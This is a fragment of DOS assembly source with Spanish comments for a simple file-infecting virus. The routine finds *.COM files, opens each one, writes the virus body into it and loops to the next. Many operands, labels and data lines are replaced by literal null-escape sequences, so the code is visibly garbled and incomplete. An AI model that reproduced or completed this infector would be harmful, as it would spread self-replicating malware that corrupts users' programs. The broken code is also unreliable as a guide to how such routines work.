\x00\x00\x00\x00                ;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
.code                                      ;Inicio del codigo
\x00\x00\x00\x00                                ;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
start:

    mov \x00\x00                      ; Buscar archivos *.COM
    \x00\x00 dx, ARCHIVO_COM     ; Dirección de la cadena '*.COM'
    int 21H                                ; Llamada a DOS para buscar el archivo

\x00\x00\x00\x00
    \x00\x00                             ; \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
    mov ax, 3D0\x00\x00                 ; Abrir archivo encontrado
    \x00\x00 FNOMBRE                  ; Nombre del archivo encontrado
    int 21H                               ; \x00\x00\x00\x00\x00\x00
    mov ah, \x00\x00H                      ; \x00\x00\x00\x00\x00\x00
    \x00\x00                          ; Tamaño del virus
    mov d\x00\x00\x00\x00                    ; Dirección del virus
    int 21H                              ; Llamada a DOS para escribir

    \x00\x00\x00\x00                     ; \x00\x00\x00\x00\x00
    int 21H                              ; Llamada a DOS para cerrar el archivo

    \x00\x00\x00\x00                    ; \x00\x00\x00\x00\x00\x00
    int 21H                               ; Llamada a DOS para buscar siguiente archivo
    jmp BUSQUEDA             ; Volver al inicio del ciclo de búsqueda

FINAL:
    \x00\x00                                      ; Terminar el programa y retornar a DOS

\x00\x00\x00\x00\x00\x00\x00\       ; \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\                        ; Dirección del nombre del archivo encontrado
\x00\x00\x00\x00
